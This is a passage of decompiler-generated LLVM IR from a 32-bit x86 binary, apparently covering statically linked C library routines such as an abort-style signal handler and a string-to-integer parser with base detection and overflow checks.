  uselistorder i32* @global_var_805686c.202, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8056840.201 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8056840.201, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8056080.200 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_805336d, { 1, 0 }
  uselistorder label %dec_label_pc_805335c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053318, { 1, 0 }
  uselistorder label %dec_label_pc_80532f7, { 1, 0 }
  uselistorder label %dec_label_pc_80532c2, { 1, 0 }
  uselistorder label %dec_label_pc_80532ba, { 1, 0 }
  uselistorder label %dec_label_pc_8053286, { 1, 0 }
}

define i32 @function_8053375() local_unnamed_addr {
dec_label_pc_8053390.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8053381 = call i32 @function_805393d(i32 ptrtoint (i32* @global_var_8056098.221 to i32))
  %v12_805338b = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805339048 = add i32 %v12_805338b, 276
  %v5_805339049 = inttoptr i32 %v4_805339048 to i32*
  store i32 0, i32* %v5_805339049, align 4
  %v0_805339b50 = load i32, i32* %eax.global-to-local, align 4
  %v1_805339b51 = add i32 %v0_805339b50, -1
  %v9_805339b52 = icmp slt i32 %v1_805339b51, 0
  store i32 %v1_805339b51, i32* %eax.global-to-local, align 4
  %v1_805339c53 = icmp eq i1 %v9_805339b52, false
  br i1 %v1_805339c53, label %dec_label_pc_8053390.dec_label_pc_8053390_crit_edge, label %dec_label_pc_805339e

dec_label_pc_8053390.dec_label_pc_8053390_crit_edge: ; preds = %dec_label_pc_8053390.lr.ph, %dec_label_pc_8053390.dec_label_pc_8053390_crit_edge
  %v1_805339b54 = phi i32 [ %v1_805339b, %dec_label_pc_8053390.dec_label_pc_8053390_crit_edge ], [ %v1_805339b51, %dec_label_pc_8053390.lr.ph ]
  %v0_8053390.pre = load i32, i32* @esp, align 4
  %v2_8053390 = mul i32 %v1_805339b54, 4
  %v3_8053390 = add i32 %v0_8053390.pre, 152
  %v4_8053390 = add i32 %v3_8053390, %v2_8053390
  %v5_8053390 = inttoptr i32 %v4_8053390 to i32*
  store i32 0, i32* %v5_8053390, align 4
  %v0_805339b = load i32, i32* %eax.global-to-local, align 4
  %v1_805339b = add i32 %v0_805339b, -1
  %v9_805339b = icmp slt i32 %v1_805339b, 0
  store i32 %v1_805339b, i32* %eax.global-to-local, align 4
  %v1_805339c = icmp eq i1 %v9_805339b, false
  br i1 %v1_805339c, label %dec_label_pc_8053390.dec_label_pc_8053390_crit_edge, label %dec_label_pc_805339e

dec_label_pc_805339e:                             ; preds = %dec_label_pc_8053390.dec_label_pc_8053390_crit_edge, %dec_label_pc_8053390.lr.ph
  %v0_805339e = load i32, i32* @ebx, align 4
  %v2_80533a2 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80533a2, i32* @ebx, align 4
  %v4_80533aa = call i32 @function_80523ce(i32 %v2_80533a2, i32 6, i32 %v0_805339e, i32 %v0_805339e)
  store i32 %v4_80533aa, i32* %eax.global-to-local, align 4
  %v1_80533b2 = icmp eq i32 %v4_80533aa, 0
  %v1_80533b4 = icmp eq i1 %v1_80533b2, false
  br i1 %v1_80533b4, label %dec_label_pc_80533c4, label %dec_label_pc_80533b6

dec_label_pc_80533b6:                             ; preds = %dec_label_pc_805339e
  %v3_80533bc = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_80533bc = call i32 @function_8051ced(i32 1, %_TYPEDEF_sigset_t* %v3_80533bc, i32 0)
  store i32 %v4_80533bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533c4

dec_label_pc_80533c4:                             ; preds = %dec_label_pc_805339e, %dec_label_pc_80533b6
  %v2_80533fc23 = phi i32 [ %v4_80533aa, %dec_label_pc_805339e ], [ %v4_80533bc, %dec_label_pc_80533b6 ]
  %v0_80533c4 = load i8, i8* @global_var_8056194.222, align 4
  %v1_80533c4 = icmp eq i8 %v0_80533c4, 0
  %v1_80533cb = icmp eq i1 %v1_80533c4, false
  br i1 %v1_80533cb, label %dec_label_pc_80533fc, label %dec_label_pc_80533cd

dec_label_pc_80533cd:                             ; preds = %dec_label_pc_80533c4
  store i8 1, i8* @global_var_8056194.222, align 4
  br label %dec_label_pc_80533d4

dec_label_pc_80533d4:                             ; preds = %dec_label_pc_805343b, %dec_label_pc_80533cd
  %v1_80533dc = call i32 @function_805393d(i32 ptrtoint (i32* @global_var_8056098.221 to i32))
  store i32 %v1_80533dc, i32* %eax.global-to-local, align 4
  %v1_80533e8 = call i32 @function_80522a0(i32 6)
  store i32 %v1_80533e8, i32* %eax.global-to-local, align 4
  %v1_80533f4 = call i32 @function_805393d(i32 ptrtoint (i32* @global_var_8056098.221 to i32))
  store i32 %v1_80533f4, i32* %eax.global-to-local, align 4
  %v0_80533fc.pre = load i8, i8* @global_var_8056194.222, align 4
  br label %dec_label_pc_80533fc

dec_label_pc_80533fc:                             ; preds = %dec_label_pc_80533c4, %dec_label_pc_80533d4
  %v2_80533fc = phi i32 [ %v2_80533fc23, %dec_label_pc_80533c4 ], [ %v1_80533f4, %dec_label_pc_80533d4 ]
  %v0_80533fc = phi i8 [ %v0_80533c4, %dec_label_pc_80533c4 ], [ %v0_80533fc.pre, %dec_label_pc_80533d4 ]
  %v1_80533fc = zext i8 %v0_80533fc to i32
  %v3_80533fc = and i32 %v2_80533fc, -256
  %v4_80533fc = or i32 %v1_80533fc, %v3_80533fc
  store i32 %v4_80533fc, i32* %eax.global-to-local, align 4
  %v10_8053401 = icmp eq i8 %v0_80533fc, 1
  %v1_8053403 = icmp eq i1 %v10_8053401, false
  br i1 %v1_8053403, label %dec_label_pc_805345d, label %dec_label_pc_8053430.lr.ph

dec_label_pc_8053430.lr.ph:                       ; preds = %dec_label_pc_80533fc
  store i8 2, i8* @global_var_8056194.222, align 4
  %v2_8053414 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8053414, i32* %eax.global-to-local, align 4
  %v3_8053419 = bitcast i32* %stack_var_-272 to i8*
  %v4_8053419 = call i32 @function_805200a(i8* %v3_8053419, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805343040 = add i32 %v12_805338b, 140
  %v5_805343041 = inttoptr i32 %v4_805343040 to i32*
  store i32 -1, i32* %v5_805343041, align 4
  %v0_805343842 = load i32, i32* %eax.global-to-local, align 4
  %v1_805343843 = add i32 %v0_805343842, -1
  %v9_805343844 = icmp slt i32 %v1_805343843, 0
  store i32 %v1_805343843, i32* %eax.global-to-local, align 4
  %v1_805343945 = icmp eq i1 %v9_805343844, false
  br i1 %v1_805343945, label %dec_label_pc_8053430.dec_label_pc_8053430_crit_edge, label %dec_label_pc_805343b

dec_label_pc_8053430.dec_label_pc_8053430_crit_edge: ; preds = %dec_label_pc_8053430.lr.ph, %dec_label_pc_8053430.dec_label_pc_8053430_crit_edge
  %v1_805343846 = phi i32 [ %v1_8053438, %dec_label_pc_8053430.dec_label_pc_8053430_crit_edge ], [ %v1_805343843, %dec_label_pc_8053430.lr.ph ]
  %v0_8053430.pre = load i32, i32* @esp, align 4
  %v2_8053430 = mul i32 %v1_805343846, 4
  %v3_8053430 = add i32 %v0_8053430.pre, 16
  %v4_8053430 = add i32 %v3_8053430, %v2_8053430
  %v5_8053430 = inttoptr i32 %v4_8053430 to i32*
  store i32 -1, i32* %v5_8053430, align 4
  %v0_8053438 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053438 = add i32 %v0_8053438, -1
  %v9_8053438 = icmp slt i32 %v1_8053438, 0
  store i32 %v1_8053438, i32* %eax.global-to-local, align 4
  %v1_8053439 = icmp eq i1 %v9_8053438, false
  br i1 %v1_8053439, label %dec_label_pc_8053430.dec_label_pc_8053430_crit_edge, label %dec_label_pc_805343b

dec_label_pc_805343b:                             ; preds = %dec_label_pc_8053430.dec_label_pc_8053430_crit_edge, %dec_label_pc_8053430.lr.ph
  store i32 %v2_8053414, i32* %eax.global-to-local, align 4
  %v4_8053450 = call i32 @function_8053b7f(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8053450, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533d4

dec_label_pc_805345d:                             ; preds = %dec_label_pc_80533fc
  %v10_805345d = icmp eq i8 %v0_80533fc, 2
  %v1_805345f = icmp eq i1 %v10_805345d, false
  br i1 %v1_805345f, label %dec_label_pc_8053469, label %dec_label_pc_8053469.thread

dec_label_pc_8053469.thread:                      ; preds = %dec_label_pc_805345d
  store i8 3, i8* @global_var_8056194.222, align 4
  br label %dec_label_pc_8053472

dec_label_pc_8053469:                             ; preds = %dec_label_pc_805345d
  %v9_8053469 = icmp eq i8 %v0_80533fc, 3
  %v1_8053470 = icmp eq i1 %v9_8053469, false
  br i1 %v1_8053470, label %dec_label_pc_8053483, label %dec_label_pc_8053472

dec_label_pc_8053472:                             ; preds = %dec_label_pc_8053469.thread, %dec_label_pc_8053469
  store i8 4, i8* @global_var_8056194.222, align 4
  %v1_805347e = call i32 @function_8053ce0(i32 127)
  unreachable

dec_label_pc_8053483:                             ; preds = %dec_label_pc_8053469, %dec_label_pc_8053483
  br label %dec_label_pc_8053483

; uselistorder directives
  uselistorder i32 %v1_8053438, { 2, 1, 0 }
  uselistorder i32 %v1_805339b, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 15, 16, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 17, 18, 13, 14 }
  uselistorder i8 3, { 0, 2, 1 }
  uselistorder i8 2, { 8, 11, 12, 1, 13, 2, 3, 4, 5, 6, 14, 15, 7, 0, 10, 16, 9 }
  uselistorder i8* @global_var_8056194.222, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8053483, { 1, 0 }
  uselistorder label %dec_label_pc_8053472, { 1, 0 }
  uselistorder label %dec_label_pc_8053430.dec_label_pc_8053430_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_80533fc, { 1, 0 }
  uselistorder label %dec_label_pc_80533c4, { 1, 0 }
  uselistorder label %dec_label_pc_8053390.dec_label_pc_8053390_crit_edge, { 1, 0 }
}

define i32 @function_8053486() local_unnamed_addr {
dec_label_pc_8053486:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v3_8053491 = call i32 @function_805349a(i32 %tmp, i32 0, i32 10)
  ret i32 %v3_8053491
}

define i32 @function_805349a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805349a:
  %v4_80534ab = inttoptr i32 %arg1 to i8*
  %v5_80534ab = call i32 @function_80534b4(i8* %v4_80534ab, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_80534ab
}

define i32 @function_80534b4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80534b4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_80534b7 = load i32, i32* @ebx, align 4
  store i32 %v0_80534b7, i32* %stack_var_-16, align 4
  %v0_80534bb = load i32, i32* bitcast (i32** @global_var_80560cc.224 to i32*), align 4
  store i32 %v0_80534bb, i32* %edx.global-to-local, align 4
  %v4_80534c1 = ptrtoint i8* %arg1 to i32
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_80534c1, i32* %ebx.global-to-local, align 4
  %v2_80534ce7 = load i8, i8* %arg1, align 1
  %v3_80534ce8 = sext i8 %v2_80534ce7 to i32
  store i32 %v3_80534ce8, i32* %eax.global-to-local, align 4
  %v2_80534d110 = mul nsw i32 %v3_80534ce8, 2
  %v3_80534d111 = add i32 %v2_80534d110, %v0_80534bb
  %v4_80534d112 = inttoptr i32 %v3_80534d111 to i8*
  %v5_80534d113 = load i8, i8* %v4_80534d112, align 1
  %v6_80534d114 = and i8 %v5_80534d113, 32
  %v7_80534d115 = icmp eq i8 %v6_80534d114, 0
  %v1_80534d516 = icmp eq i1 %v7_80534d115, false
  br i1 %v1_80534d516, label %dec_label_pc_80534cd, label %dec_label_pc_80534d7

dec_label_pc_80534cd:                             ; preds = %dec_label_pc_80534b4, %dec_label_pc_80534cd
  %v0_80534cd = phi i32 [ %v1_80534cd, %dec_label_pc_80534cd ], [ %v4_80534c1, %dec_label_pc_80534b4 ]
  %v1_80534cd = add i32 %v0_80534cd, 1
  store i32 %v1_80534cd, i32* %ebx.global-to-local, align 4
  %v1_80534ce = inttoptr i32 %v1_80534cd to i8*
  %v2_80534ce = load i8, i8* %v1_80534ce, align 1
  %v3_80534ce = sext i8 %v2_80534ce to i32
  store i32 %v3_80534ce, i32* %eax.global-to-local, align 4
  %v2_80534d1 = mul nsw i32 %v3_80534ce, 2
  %v3_80534d1 = add i32 %v2_80534d1, %v0_80534bb
  %v4_80534d1 = inttoptr i32 %v3_80534d1 to i8*
  %v5_80534d1 = load i8, i8* %v4_80534d1, align 1
  %v6_80534d1 = and i8 %v5_80534d1, 32
  %v7_80534d1 = icmp eq i8 %v6_80534d1, 0
  %v1_80534d5 = icmp eq i1 %v7_80534d1, false
  br i1 %v1_80534d5, label %dec_label_pc_80534cd, label %dec_label_pc_80534d7

dec_label_pc_80534d7:                             ; preds = %dec_label_pc_80534cd, %dec_label_pc_80534b4
  %v0_80534ec = phi i32 [ %v4_80534c1, %dec_label_pc_80534b4 ], [ %v1_80534cd, %dec_label_pc_80534cd ]
  %v4_8053505 = phi i32 [ %v3_80534ce8, %dec_label_pc_80534b4 ], [ %v3_80534ce, %dec_label_pc_80534cd ]
  %v9_80534d7 = icmp eq i32 %v4_8053505, 43
  br i1 %v9_80534d7, label %dec_label_pc_80534ec, label %dec_label_pc_80534dc

dec_label_pc_80534dc:                             ; preds = %dec_label_pc_80534d7
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_80534de = icmp eq i32 %v4_8053505, 45
  %v1_80534e1 = icmp eq i1 %v9_80534de, false
  br i1 %v1_80534e1, label %dec_label_pc_80534ed, label %dec_label_pc_80534ec

dec_label_pc_80534ec:                             ; preds = %dec_label_pc_80534d7, %dec_label_pc_80534dc
  %storemerge2 = phi i32 [ 1, %dec_label_pc_80534dc ], [ 0, %dec_label_pc_80534d7 ]
  store i32 %storemerge2, i32* %ebp.global-to-local, align 4
  %v1_80534ec = add i32 %v0_80534ec, 1
  store i32 %v1_80534ec, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80534ed

dec_label_pc_80534ed:                             ; preds = %dec_label_pc_80534dc, %dec_label_pc_80534ec
  %v0_80534ff = phi i32 [ %v0_80534ec, %dec_label_pc_80534dc ], [ %v1_80534ec, %dec_label_pc_80534ec ]
  %v1_80534ef = and i32 %arg3, -17
  %v2_80534ef = icmp eq i32 %v1_80534ef, 0
  %v1_80534f5 = icmp eq i1 %v2_80534ef, false
  br i1 %v1_80534f5, label %dec_label_pc_805351b, label %dec_label_pc_80534f7

dec_label_pc_80534f7:                             ; preds = %dec_label_pc_80534ed
  %v1_80534f7 = add i32 %arg3, 10
  store i32 %v1_80534f7, i32* %esi.global-to-local, align 4
  %v1_80534fa = inttoptr i32 %v0_80534ff to i8*
  %v2_80534fa = load i8, i8* %v1_80534fa, align 1
  %v8_80534fa = icmp eq i8 %v2_80534fa, 48
  %v1_80534fd = icmp eq i1 %v8_80534fa, false
  br i1 %v1_80534fd, label %dec_label_pc_8053511, label %dec_label_pc_80534ff

dec_label_pc_80534ff:                             ; preds = %dec_label_pc_80534f7
  %v1_80534ff = add i32 %v0_80534ff, 1
  store i32 %v1_80534ff, i32* %ebx.global-to-local, align 4
  %v1_8053500 = add i32 %arg3, 8
  store i32 %v1_8053500, i32* %esi.global-to-local, align 4
  %v1_8053505 = inttoptr i32 %v1_80534ff to i8*
  %v2_8053505 = load i8, i8* %v1_8053505, align 1
  %v3_8053505 = zext i8 %v2_8053505 to i32
  %v5_8053505 = and i32 %v4_8053505, -256
  %v6_8053505 = or i32 %v5_8053505, %v3_8053505
  %v1_8053507 = or i32 %v6_8053505, 32
  %v3_8053507 = trunc i32 %v1_8053507 to i8
  store i32 %v1_8053507, i32* %eax.global-to-local, align 4
  %v10_805350a = icmp eq i8 %v3_8053507, 120
  %v1_805350c = icmp eq i1 %v10_805350a, false
  br i1 %v1_805350c, label %dec_label_pc_8053511, label %dec_label_pc_805350e

dec_label_pc_805350e:                             ; preds = %dec_label_pc_80534ff
  %v2_805350e = mul i32 %v1_8053500, 2
  store i32 %v2_805350e, i32* %esi.global-to-local, align 4
  %v1_8053510 = add i32 %v0_80534ff, 2
  store i32 %v1_8053510, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053511

dec_label_pc_8053511:                             ; preds = %dec_label_pc_80534ff, %dec_label_pc_80534f7, %dec_label_pc_805350e
  %v0_805353a25 = phi i32 [ %v1_80534ff, %dec_label_pc_80534ff ], [ %v0_80534ff, %dec_label_pc_80534f7 ], [ %v1_8053510, %dec_label_pc_805350e ]
  %v0_805359133 = phi i32 [ %v1_80534ff, %dec_label_pc_80534ff ], [ %v4_80534c1, %dec_label_pc_80534f7 ], [ %v1_80534ff, %dec_label_pc_805350e ]
  %v0_8053511 = phi i32 [ %v1_8053500, %dec_label_pc_80534ff ], [ %v1_80534f7, %dec_label_pc_80534f7 ], [ %v2_805350e, %dec_label_pc_805350e ]
  %v7_8053514 = icmp sgt i32 %v0_8053511, 16
  br i1 %v7_8053514, label %dec_label_pc_805351b.thread, label %dec_label_pc_805351b

dec_label_pc_805351b.thread:                      ; preds = %dec_label_pc_8053511
  store i32 16, i32* %esi.global-to-local, align 4
  store i32 14, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053525

dec_label_pc_805351b:                             ; preds = %dec_label_pc_8053511, %dec_label_pc_80534ed
  %v0_805359134 = phi i32 [ %v0_805359133, %dec_label_pc_8053511 ], [ %v4_80534c1, %dec_label_pc_80534ed ]
  %v0_805353a26 = phi i32 [ %v0_805353a25, %dec_label_pc_8053511 ], [ %v0_80534ff, %dec_label_pc_80534ed ]
  %v0_805352a = phi i32 [ %v0_8053511, %dec_label_pc_8053511 ], [ %arg3, %dec_label_pc_80534ed ]
  %v1_805351b = add i32 %v0_805352a, -2
  store i32 %v1_805351b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8053523 = icmp ugt i32 %v1_805351b, 34
  br i1 %v6_8053523, label %dec_label_pc_8053586, label %dec_label_pc_8053525

dec_label_pc_8053525:                             ; preds = %dec_label_pc_805351b.thread, %dec_label_pc_805351b
  %v0_805352a58 = phi i32 [ 16, %dec_label_pc_805351b.thread ], [ %v0_805352a, %dec_label_pc_805351b ]
  %v0_805353a2657 = phi i32 [ %v0_805353a25, %dec_label_pc_805351b.thread ], [ %v0_805353a26, %dec_label_pc_805351b ]
  %v0_80535913456 = phi i32 [ %v0_805359133, %dec_label_pc_805351b.thread ], [ %v0_805359134, %dec_label_pc_805351b ]
  %div = udiv i32 -1, %v0_805352a58
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp51 = urem i32 -1, %v0_805352a58
  %v1_805352c = trunc i32 %tmp51 to i8
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8053566 = urem i32 %arg4, 256
  br label %dec_label_pc_805353a

dec_label_pc_8053538:                             ; preds = %dec_label_pc_805357c, %dec_label_pc_8053566
  %v4_805353a.pre = phi i32 [ %v1_8053550, %dec_label_pc_805357c ], [ %v4_805353a.pre.pre, %dec_label_pc_8053566 ]
  %v0_8053538 = phi i32 [ %v1_8053557, %dec_label_pc_805357c ], [ %v0_8053538.pre, %dec_label_pc_8053566 ]
  br label %dec_label_pc_805353a

dec_label_pc_805353a:                             ; preds = %dec_label_pc_8053525, %dec_label_pc_8053538
  %v0_805359132 = phi i32 [ %v0_80535913456, %dec_label_pc_8053525 ], [ %v0_8053538, %dec_label_pc_8053538 ]
  %v0_8053557 = phi i32 [ %v0_805353a2657, %dec_label_pc_8053525 ], [ %v0_8053538, %dec_label_pc_8053538 ]
  %v4_805353a = phi i32 [ %div, %dec_label_pc_8053525 ], [ %v4_805353a.pre, %dec_label_pc_8053538 ]
  %v1_805353a = inttoptr i32 %v0_8053557 to i8*
  %v2_805353a = load i8, i8* %v1_805353a, align 1
  %v3_805353a = zext i8 %v2_805353a to i32
  %v5_805353a = and i32 %v4_805353a, -256
  %v6_805353a = or i32 %v3_805353a, %v5_805353a
  store i32 %v6_805353a, i32* %eax.global-to-local, align 4
  %v1_805353c = add i32 %v6_805353a, -48
  %v1_805353f = trunc i32 %v1_805353c to i8
  %tmp59 = icmp ult i8 %v1_805353f, 10
  br i1 %tmp59, label %dec_label_pc_8053550, label %dec_label_pc_8053544

dec_label_pc_8053544:                             ; preds = %dec_label_pc_805353a
  %v1_8053544 = or i32 %v6_805353a, 32
  %v3_8053544 = trunc i32 %v1_8053544 to i8
  store i32 %v1_8053544, i32* %eax.global-to-local, align 4
  %v1_8053547 = and i32 %v1_805353c, -256
  %v2_8053547 = or i32 %v1_8053547, 40
  %tmp60 = icmp ult i8 %v3_8053544, 97
  br i1 %tmp60, label %dec_label_pc_8053550, label %dec_label_pc_805354d

dec_label_pc_805354d:                             ; preds = %dec_label_pc_8053544
  %v1_805354d = add i32 %v1_8053544, -87
  br label %dec_label_pc_8053550

dec_label_pc_8053550:                             ; preds = %dec_label_pc_8053544, %dec_label_pc_805353a, %dec_label_pc_805354d
  %v0_805357f = phi i32 [ %v2_8053547, %dec_label_pc_8053544 ], [ %v1_805353c, %dec_label_pc_805353a ], [ %v1_805354d, %dec_label_pc_805354d ]
  %v1_8053550 = urem i32 %v0_805357f, 256
  store i32 %v1_8053550, i32* %eax.global-to-local, align 4
  %v1_8053553 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053553 = sub i32 %v1_8053550, %v1_8053553
  %v10_8053553 = and i32 %v2_8053553, %v1_8053553
  %v11_8053553 = icmp slt i32 %v10_8053553, 0
  %v13_8053553 = icmp slt i32 %v2_8053553, 0
  %v2_8053555 = icmp eq i1 %v13_8053553, %v11_8053553
  br i1 %v2_8053555, label %dec_label_pc_8053586, label %dec_label_pc_8053557

dec_label_pc_8053557:                             ; preds = %dec_label_pc_8053550
  %v1_8053557 = add i32 %v0_8053557, 1
  store i32 %v1_8053557, i32* %ebx.global-to-local, align 4
  %v0_8053558 = load i32, i32* %edx.global-to-local, align 4
  %tmp61 = icmp ugt i32 %v0_8053558, %div
  br i1 %tmp61, label %dec_label_pc_8053566, label %dec_label_pc_805355e

dec_label_pc_805355e:                             ; preds = %dec_label_pc_8053557
  %v15_8053558 = icmp eq i32 %v0_8053558, %div
  %v1_805355e = icmp eq i1 %v15_8053558, false
  br i1 %v1_805355e, label %dec_label_pc_805357c, label %dec_label_pc_8053560

dec_label_pc_8053560:                             ; preds = %dec_label_pc_805355e
  %v1_8053560 = trunc i32 %v0_805357f to i8
  %tmp62 = icmp ugt i8 %v1_8053560, %v1_805352c
  br i1 %tmp62, label %dec_label_pc_8053566, label %dec_label_pc_805357c

dec_label_pc_8053566:                             ; preds = %dec_label_pc_8053560, %dec_label_pc_8053557
  store i32 %v4_8053566, i32* %eax.global-to-local, align 4
  %v0_805356a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805356a = and i32 %v0_805356a, %v4_8053566
  store i32 %v2_805356a, i32* %ebp.global-to-local, align 4
  %v1_805356c = call i32 @function_8051fb9(i32 %div)
  store i32 %v1_805356c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8053574 = inttoptr i32 %v1_805356c to i32*
  store i32 34, i32* %v1_8053574, align 4
  %v0_8053538.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805353a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053538

dec_label_pc_805357c:                             ; preds = %dec_label_pc_8053560, %dec_label_pc_805355e
  %v4_805357c = mul i32 %v0_8053558, %v1_8053553
  store i32 %v1_8053550, i32* %eax.global-to-local, align 4
  %v2_8053582 = add i32 %v4_805357c, %v1_8053550
  store i32 %v2_8053582, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053538

dec_label_pc_8053586:                             ; preds = %dec_label_pc_8053550, %dec_label_pc_805351b
  %v0_8053591 = phi i32 [ %v0_805359134, %dec_label_pc_805351b ], [ %v0_805359132, %dec_label_pc_8053550 ]
  %stack_var_-24.0 = phi i32 [ %tmp41, %dec_label_pc_805351b ], [ %div, %dec_label_pc_8053550 ]
  %v4_8053586 = icmp eq i32 %arg2, 0
  br i1 %v4_8053586, label %dec_label_pc_8053593, label %dec_label_pc_805358d

dec_label_pc_805358d:                             ; preds = %dec_label_pc_8053586
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8053591 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8053591, i32* %v2_8053591, align 4
  br label %dec_label_pc_8053593

dec_label_pc_8053593:                             ; preds = %dec_label_pc_8053586, %dec_label_pc_805358d
  %v0_8053593 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_8053593, i32* %eax.global-to-local, align 4
  %v1_8053595 = trunc i32 %v0_8053593 to i8
  %v6_8053595 = icmp eq i8 %v1_8053595, 0
  %v2_8053597 = zext i1 %v6_8053595 to i32
  %v1_80535993 = or i32 %v2_8053597, -2147483648
  store i32 %v1_80535993, i32* %ebx.global-to-local, align 4
  %v5_805359f = icmp eq i8 %tmp, 0
  br i1 %v5_805359f, label %dec_label_pc_80535b7, label %dec_label_pc_80535a6

dec_label_pc_80535a6:                             ; preds = %dec_label_pc_8053593
  %v0_80535a6 = load i32, i32* %edx.global-to-local, align 4
  %tmp63 = icmp ugt i32 %v0_80535a6, %v1_80535993
  br i1 %tmp63, label %dec_label_pc_80535aa, label %dec_label_pc_80535b7

dec_label_pc_80535aa:                             ; preds = %dec_label_pc_80535a6
  %v1_80535aa = call i32 @function_8051fb9(i32 %stack_var_-24.0)
  store i32 %v1_80535aa, i32* %eax.global-to-local, align 4
  %v0_80535af = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80535af, i32* %edx.global-to-local, align 4
  %v1_80535b1 = inttoptr i32 %v1_80535aa to i32*
  store i32 34, i32* %v1_80535b1, align 4
  %v0_80535b7.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80535b7

dec_label_pc_80535b7:                             ; preds = %dec_label_pc_80535a6, %dec_label_pc_8053593, %dec_label_pc_80535aa
  %v0_80535b7 = phi i32 [ %v0_8053593, %dec_label_pc_80535a6 ], [ %v0_8053593, %dec_label_pc_8053593 ], [ %v0_80535b7.pre, %dec_label_pc_80535aa ]
  store i32 %v0_80535b7, i32* %eax.global-to-local, align 4
  %v3_80535b9 = trunc i32 %v0_80535b7 to i8
  %v4_80535b9 = icmp eq i8 %v3_80535b9, 0
  %v0_80535c2.pre = load i32, i32* %edx.global-to-local, align 4
  br i1 %v4_80535b9, label %dec_label_pc_80535bf, label %dec_label_pc_80535bd

dec_label_pc_80535bd:                             ; preds = %dec_label_pc_80535b7
  %v1_80535bd = sub i32 0, %v0_80535c2.pre
  store i32 %v1_80535bd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80535bf

dec_label_pc_80535bf:                             ; preds = %dec_label_pc_80535b7, %dec_label_pc_80535bd
  %v0_80535c2 = phi i32 [ %v1_80535bd, %dec_label_pc_80535bd ], [ %v0_80535c2.pre, %dec_label_pc_80535b7 ]
  store i32 %v0_80535c2, i32* %eax.global-to-local, align 4
  %v2_80535c4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80535c4, i32* @ebx, align 4
  ret i32 %v0_80535c2

; uselistorder directives
  uselistorder i32 %v0_80535c2, { 1, 0 }
  uselistorder i32 %v0_80535b7, { 1, 0 }
  uselistorder i32 %v0_8053558, { 0, 2, 1 }
  uselistorder i32 %v1_8053557, { 1, 0 }
  uselistorder i32 %v2_8053553, { 1, 0 }
  uselistorder i32 %v1_8053550, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_805357f, { 1, 0 }
  uselistorder i32 %v0_8053538, { 1, 0 }
  uselistorder i32 %v4_8053566, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_805352a58, { 1, 0 }
  uselistorder i32 %v0_805359134, { 1, 0 }
  uselistorder i32 %v2_805350e, { 1, 0 }
  uselistorder i32 %v1_8053507, { 1, 0 }
  uselistorder i32 %v1_8053500, { 1, 0, 2 }
  uselistorder i32 %v0_80534ff, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_8053505, { 2, 0, 1 }
  uselistorder i32 %v1_80534cd, { 0, 3, 2, 1 }
  uselistorder i32 %v4_80534c1, { 3, 2, 1, 0, 4 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
